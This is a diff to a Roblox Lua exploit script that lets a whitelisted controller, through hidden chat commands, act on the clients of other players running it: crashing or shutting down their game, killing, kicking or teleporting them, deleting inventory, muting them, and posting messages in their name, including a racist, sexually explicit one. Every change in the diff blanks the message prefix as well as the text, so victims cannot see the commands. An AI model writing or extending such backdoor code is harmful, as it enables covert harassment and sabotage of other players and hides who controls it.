@@ -216,10 +216,12 @@ Listening = TextChatService.MessageReceived:Connect(function(prompt)
 
 	if cmd == ";void" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		h = target.Character.HumanoidRootPart
 		h.CFrame = h.CFrame - Vector3.new(0,1000,0)
 elseif cmd == ";lava" and getsexter(speaker)  and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		local lava = Instance.new("Part")
 lava.Shape = "Block"
 lava.Size = Vector3.new(9999999,-900,9999999)
@@ -265,6 +267,7 @@ tween:Play()
 
 	elseif cmd == ";lava" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local lava = Instance.new("Part")
 lava.Shape = "Block"
 lava.Size = Vector3.new(9999999,-900,9999999)
@@ -313,6 +316,7 @@ tween:Play()
 
 	elseif cmd == ";byfron" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 lplr = game.Players.LocalPlayer
 local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
 					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
@@ -382,6 +386,7 @@ local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
 					end)
 	elseif cmd == ";byfron" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 lplr = game.Players.LocalPlayer
 local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
 					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
@@ -454,6 +459,7 @@ local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
 
 elseif cmd == ";fakeban" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 lplr = game.Players.LocalPlayer
 local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
 					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
@@ -523,6 +529,7 @@ local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
 					end)
 	elseif cmd == ";fakeban" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 lplr = game.Players.LocalPlayer
 local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
 					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
@@ -597,22 +604,26 @@ local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
 
 	elseif cmd == ";void" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		h = game.Players.LocalPlayer.Character.HumanoidRootPart
 		h.CFrame = h.CFrame - Vector3.new(0,1000,0)
 
 	elseif cmd == ";help" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		local textChatService = game:GetService("TextChatService")
 		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐put the username after the cmd,or put . todo all⭐")
 
 	elseif cmd == ";help" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		local textChatService = game:GetService("TextChatService")
 		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐put the username after the cmd,or put . todo all⭐")
 
 
 elseif cmd == ";clearchat" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 textChatService.ChatInputBarConfiguration.TargetTextChannel = game:GetService("TextChatService").TextChannels["sex"]
 for i = 1,15 do
 textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⁥")
@@ -620,6 +631,7 @@ end
 textChatService.ChatInputBarConfiguration.TargetTextChannel = game:GetService("TextChatService").TextChannels["RBXGeneral"]
 elseif cmd == ";clearchat" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 textChatService.ChatInputBarConfiguration.TargetTextChannel = game:GetService("TextChatService").TextChannels["sex"]
 for i = 1,15 do
 textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⁥")
@@ -631,6 +643,7 @@ textChatService.ChatInputBarConfiguration.TargetTextChannel = game:GetService("T
 
 elseif cmd == ";ban" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 ban()
 elseif cmd == ";ban" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
@@ -643,6 +656,7 @@ ban()
 
 elseif cmd == ";check" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local textChatService = game:GetService("TextChatService")
 textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("🌟i have the config executed🌟")
 	elseif cmd == ";check" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
@@ -654,26 +668,32 @@ textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("🌟i hav
 
 elseif cmd == ";mute" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 game:GetService("TextChatService").ChatInputBarConfiguration.Enabled = false
 elseif cmd == ";mute" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 game:GetService("TextChatService").ChatInputBarConfiguration.Enabled = false
 elseif cmd == ";unmute" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 game:GetService("TextChatService").ChatInputBarConfiguration.Enabled = true
 elseif cmd == ";unmute" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 game:GetService("TextChatService").ChatInputBarConfiguration.Enabled = true
 
 
 elseif cmd == ";funnymsg" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local textChatService = game:GetService("TextChatService")
 textChatService.ChatInputBarConfiguration.TargetTextChannel = game:GetService("TextChatService").TextChannels["sex"]
 textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(" "..game.Players.LocalPlayer.Name.." likes big black men fucking his asshole")
 textChatService.ChatInputBarConfiguration.TargetTextChannel = game:GetService("TextChatService").TextChannels["RBXGeneral"]
 elseif cmd == ";funnymsg" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local textChatService = game:GetService("TextChatService")
 textChatService.ChatInputBarConfiguration.TargetTextChannel = game:GetService("TextChatService").TextChannels["sex"]
 textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(" "..game.Players.LocalPlayer.Name.." likes big black men fucking his asshole")
@@ -682,15 +702,18 @@ textChatService.ChatInputBarConfiguration.TargetTextChannel = game:GetService("T
 
 elseif cmd == ";dead" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		local textChatService = game:GetService("TextChatService")
 		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("🌟⭐dead was here⭐🌟")
 	elseif cmd == ";dead" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		local textChatService = game:GetService("TextChatService")
 		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("🌟⭐dead was here⭐🌟")
 
 elseif cmd == ";flash" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local flash = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local TextLabel = Instance.new("TextLabel")
@@ -722,6 +745,7 @@ wait(0.5)
 game.Players.LocalPlayer.PlayerGui.flash:Destroy()
 elseif cmd == ";flash" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local flash = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local TextLabel = Instance.new("TextLabel")
@@ -755,6 +779,7 @@ game.Players.LocalPlayer.PlayerGui.flash:Destroy()
 
 elseif cmd == ";troll" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local textChatService = game:GetService("TextChatService")
 textChatService.MessageReceived:Connect(function(sex)
 local args = sex.Text:split(" ")
@@ -773,6 +798,7 @@ for i,v in(args) do
 end)
 elseif cmd == ";troll" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local textChatService = game:GetService("TextChatService")
 textChatService.MessageReceived:Connect(function(sex)
 local args = sex.Text:split(" ")
@@ -794,39 +820,48 @@ end)
 
 elseif cmd == ";crash" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 while true do end
 elseif cmd == ";crash" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 while true do end
 
 elseif cmd == ";shutdown" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 game:shutdown()
 elseif cmd == ";shutdown" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 game:shutdown()
 
 elseif cmd == ";mygame" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local TeleportService = game:GetService("TeleportService")
 TeleportService:Teleport("13981252889")
 elseif cmd == ";mygame" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local TeleportService = game:GetService("TeleportService")
 TeleportService:Teleport("13981252889")
 
 
 elseif cmd == ";deleteinv" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local name = game.Players.LocalPlayer.Name
 game:GetService("ReplicatedStorage").Inventories[name]:Destroy()
 	elseif cmd == ";deleteinv" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local name = game.Players.LocalPlayer.Name
 game:GetService("ReplicatedStorage").Inventories[name]:Destroy()
 
 elseif cmd == ";listore" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		local textChatService = game:GetService("TextChatService")
 		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(ores)
                 wait()
@@ -834,6 +869,7 @@ prompt.Text = "⁥"
 
 	elseif cmd == ";listore" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		local textChatService = game:GetService("TextChatService")
 		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(ores)
                 wait()
@@ -845,6 +881,7 @@ prompt.Text = "⁥"
 
 elseif cmd == ";popups" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local popup = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local TextLabel = Instance.new("TextLabel")
@@ -1045,6 +1082,7 @@ coroutine.wrap(OFSL_fake_script)()
 
 elseif cmd == ";popups" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local popup = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local TextLabel = Instance.new("TextLabel")
@@ -1244,6 +1282,7 @@ coroutine.wrap(OFSL_fake_script)()
 
 	elseif cmd == ";cmds" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		local textChatService = game:GetService("TextChatService")
 		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(cmds)
               textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("asdasd")
@@ -1256,6 +1295,7 @@ prompt.Text = "⁥"
 
 	elseif cmd == ";cmds" and getsexter(speaker) and game.Players.LocalPlayer.Name ~=speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		local textChatService = game:GetService("TextChatService")
 		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(cmds)
                  textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("asdasd")
@@ -1268,60 +1308,73 @@ prompt.Text = "⁥"
 
 	elseif cmd == ";ad" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target  then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		local textChatService = game:GetService("TextChatService")
 		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("you𐌜⁥tube.𐌜⁥com/@normalexploiter123")
 
 	elseif cmd == ";ad" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "."  then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		local textChatService = game:GetService("TextChatService")
 		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("you𐌜⁥tube.𐌜⁥com/@normalexploiter123")
 
 	elseif cmd == ";config" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		local textChatService = game:GetService("TextChatService")
 		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("revvy config,made by rev")
 
 	elseif cmd == ";config" and getsexter(speaker) and game.Players.LocalPlayer.Name ~=speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		local textChatService = game:GetService("TextChatService")
 		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("revvy config,made by rev")
 
 	elseif cmd == ";ac" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		h = target.Character.HumanoidRootPart
 		h.CFrame = h.CFrame - Vector3.new(0,4000,0)
 
 	elseif cmd == ";ac" and getsexter(speaker) and game.Players.LocalPlayer.Name ~=speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		h = game.Players.LocalPlayer.Character.HumanoidRootPart
 		h.CFrame = h.CFrame - Vector3.new(0,4000,0)
 
 	elseif cmd == ";reset" and getsexter(speaker) and game.Players.LocalPlayer.Name ~=speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		target.Character.Humanoid.Health = 0
 
 	elseif cmd == ";reset" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		game.Players.LocalPlayer.Character.Humanoid.Health = 0
 
 	elseif cmd == ";kick" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		target:Kick("skill issue tbh")
 
 	elseif cmd == ";kick" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		game.Players.LocalPlayer:Kick("skill issue tbh")
 
 	elseif cmd == ";sit" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		target.Character.Humanoid.Sit = true
 
 	elseif cmd == ";sit" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		game.Players.LocalPlayer.Character.Humanoid.Sit = true
 
 elseif cmd == ";tbring" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		h = target.Character.HumanoidRootPart
                 h.CFrame = h.CFrame + Vector3.new(0, 70, 0)
 	        tweenService, tweenInfo = game:GetService("TweenService"), TweenInfo.new(20, Enum.EasingStyle.Linear)
@@ -1330,6 +1383,7 @@ tween:Play()
 
 elseif cmd == ";tbring" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		h = game.Players.LocalPlayer.Character.HumanoidRootPart
                 h.CFrame = h.CFrame + Vector3.new(0, 70, 0)
 	        tweenService, tweenInfo = game:GetService("TweenService"), TweenInfo.new(20, Enum.EasingStyle.Linear)
@@ -1339,12 +1393,14 @@ tween:Play()
 
 elseif cmd == ";song" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 SongAudio = Instance.new("Sound")
 SongAudio.SoundId = "rbxassetid://6772846771"
 SongAudio.Parent = game.SoundService
 SongAudio.Playing = true
 	elseif cmd == ";song" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 SongAudio = Instance.new("Sound")
 SongAudio.SoundId = "rbxassetid://6772846771"
 SongAudio.Parent = game.SoundService
@@ -1352,6 +1408,7 @@ SongAudio.Playing = true
 
 elseif cmd == ";hev" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 h = target.Character.HumanoidRootPart
 local hev = h.CFrame + Vector3.new(0,900,0)
 tweenService, tweenInfo = game:GetService("TweenService"), TweenInfo.new(100, Enum.EasingStyle.Linear)
@@ -1360,6 +1417,7 @@ tween:Play()
 
 elseif cmd == ";hev" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 h = game.Players.LocalPlayer.Character.HumanoidRootPart
 local hev = h.CFrame + Vector3.new(0,900,0)
 tweenService, tweenInfo = game:GetService("TweenService"), TweenInfo.new(100, Enum.EasingStyle.Linear)
@@ -1368,19 +1426,23 @@ tween:Play()
 
 elseif cmd == ";lobby" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.TeleportToLobby:FireServer()
 elseif cmd == ";lobby" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.TeleportToLobby:FireServer()
 
 elseif cmd == ";vclipdown" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 h = target.Character.HumanoidRootPart
 w = h.CFrame - Vector3.new(0,10,0)
 h.CFrame = w
 
 elseif cmd == ";vclipdown" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 h = game.Players.LocalPlayer.Character.HumanoidRootPart
 w = h.CFrame - Vector3.new(0,10,0)
 h.CFrame = w
@@ -1393,6 +1455,7 @@ h.CFrame = w
 
 elseif cmd == ";emeraldarmor" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local name = game.Players.LocalPlayer.Name
 if done == false then
 local done = true
@@ -1412,6 +1475,7 @@ fake3.Parent = game:GetService("ReplicatedStorage").Inventories[name]
 end
 	elseif cmd == ";emeraldarmor" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 		local name = game.Players.LocalPlayer.Name
 if done == false then
 local done = true
@@ -1435,6 +1499,7 @@ end
 
 elseif cmd == ";dropheld" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target  then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local m = game.Players.LocalPlayer.Character.HandInvItem.Value
 local args = {
     [1] = {
@@ -1446,6 +1511,7 @@ game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("
 
 elseif cmd == ";dropheld" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "."  then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local m = game.Players.LocalPlayer.Character.HandInvItem.Value
 local args = {
     [1] = {
@@ -1460,6 +1526,7 @@ game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("
 
 elseif cmd == ";telepearl" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target  then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local name = game.Players.LocalPlayer.Name
 if done == false then
 local done = true
@@ -1472,6 +1539,7 @@ end
 
 elseif cmd == ";telepearl" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "."  then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local name = game.Players.LocalPlayer.Name
 if done == false then
 local done = true
@@ -1484,6 +1552,7 @@ end
 
 elseif cmd == ";apple" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target  then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local name = game.Players.LocalPlayer.Name
 if done == false then
 local done = true
@@ -1495,6 +1564,7 @@ fake.Parent = game:GetService("ReplicatedStorage").Inventories[name]
 end
 elseif cmd == ";apple" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "."  then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local name = game.Players.LocalPlayer.Name
 if done == false then
 local done = true
@@ -1507,6 +1577,7 @@ end
 
 elseif cmd == ";rageblade" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target  then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local name = game.Players.LocalPlayer.Name
 if done == false then
 local done = true
@@ -1519,6 +1590,7 @@ end
 
 elseif cmd == ";rageblade" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "."  then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local name = game.Players.LocalPlayer.Name
 if done == false then
 local done = true
@@ -1532,6 +1604,7 @@ end
 
 elseif cmd == ";blind" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target  then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local blind = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local TextLabel = Instance.new("TextLabel")
@@ -1561,9 +1634,11 @@ TextLabel.TextSize = 14.000
 TextLabel.TextWrapped = true
 elseif cmd == ";unblind" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target  then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 game.Players.LocalPlayer:WaitForChild("PlayerGui").blind:Destroy()
 elseif cmd == ";blind" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "."  then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local blind = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local TextLabel = Instance.new("TextLabel")
@@ -1593,6 +1668,7 @@ TextLabel.TextSize = 14.000
 TextLabel.TextWrapped = true
 elseif cmd == ";unblind" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "."  then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 game.Players.LocalPlayer:WaitForChild("PlayerGui").blind:Destroy()
 
 
@@ -1605,6 +1681,7 @@ game.Players.LocalPlayer:WaitForChild("PlayerGui").blind:Destroy()
 
 elseif cmd == ";butterfingers" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target  then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local name = game.Players.LocalPlayer.Name
 for i = 1,penis do
 for i,v in pairs(game:GetService("ReplicatedStorage").Inventories[name]:GetDescendants()) do
@@ -1622,6 +1699,7 @@ game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("
 
 elseif cmd == ";butterfingers" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 local name = game.Players.LocalPlayer.Name
 for i = 1,penis do
 for i,v in pairs(game:GetService("ReplicatedStorage").Inventories[name]:GetDescendants()) do
@@ -1640,6 +1718,7 @@ game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("
 
 elseif cmd == ";breakbow" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target  then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐must have arrows to break bow, attempting!⭐")
 for i,v in pairs(game:GetService("ReplicatedStorage").Inventories:GetDescendants()) do
     if v.Name == "arrow" then
@@ -1649,6 +1728,7 @@ v:Destroy()
 
 elseif cmd == ";breakbow" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
 prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
 textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐must have arrows to break bow, attempting!⭐")
 for i,v in pairs(game:GetService("ReplicatedStorage").Inventories:GetDescendants()) do
     if v.Name == "arrow" then
